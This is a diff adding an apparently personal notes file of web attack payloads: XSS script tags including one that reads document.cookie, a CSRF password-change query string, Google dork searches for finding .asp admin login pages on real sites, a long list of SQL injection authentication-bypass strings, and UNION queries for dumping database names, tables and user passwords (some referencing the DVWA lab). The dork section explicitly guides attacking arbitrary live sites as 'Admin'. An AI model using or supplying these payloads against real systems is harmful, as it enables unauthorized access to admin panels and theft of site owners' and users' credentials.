@@ -1,0 +1,80 @@
+For XXS
+<script>alert("Dangerous");</script>
+<script>alert("TesT")</script> <script>alert(document.cookie)</script>
+
+?password_new=pass&password_conf=pass&Change=Change
+
+Gaining auth bypass on an admin account.
+Most sites vulnerable to this are .asp
+First we need 2 find a site, start by opening google.
+Now we type our dork: "defenition of dork" 'a search entry for a certain type of site/exploit .ect"
+There is a large number of google dork for basic sql injection. 
+here is the best:
+"inurl:admin.asp"
+"inurl:login/admin.asp"
+"inurl:admin/login.asp"
+"inurl:adminlogin.asp"
+"inurl:adminhome.asp"
+"inurl:admin_login.asp"
+"inurl:administratorlogin.asp"
+"inurl:login/administrator.asp"
+"inurl:administrator_login.asp"
+
+Now what to do once we get to our site.
+the site should look something like this :
+
+welcome to xxxxxxxxxx administrator panel
+username :
+password :
+
+so what we do here is in the username we always type "Admin"
+and for our password we type our sql injection
+
+here is a list of sql injections
+
+' or '1'='1
+' or 'x'='x
+' or 0=0 -- 
+
+" or 0=0 -- 
+
+or 0=0 -- 
+
+' or 0=0 # 
+
+" or 0=0 # 
+
+or 0=0 # 
+
+' or 'x'='x 
+
+" or "x"="x 
+
+') or ('x'='x 
+
+' or 1=1-- 
+
+" or 1=1-- 
+
+or 1=1-- 
+
+' or a=a-- 
+
+" or "a"="a 
+
+') or ('a'='a 
+
+") or ("a"="a 
+
+hi" or "a"="a 
+
+hi" or 1=1 -- 
+
+hi' or 1=1 -- 
+'or'1=1'
+
+1'or'1'='1
+
+to find database name:- ' union select database(), null--space
+to find table in database:- ' union select table_name, column_name from information_schema.columns where table_schema ='dvwa'--space
+to find password from table:- ' union select user, password from users--space
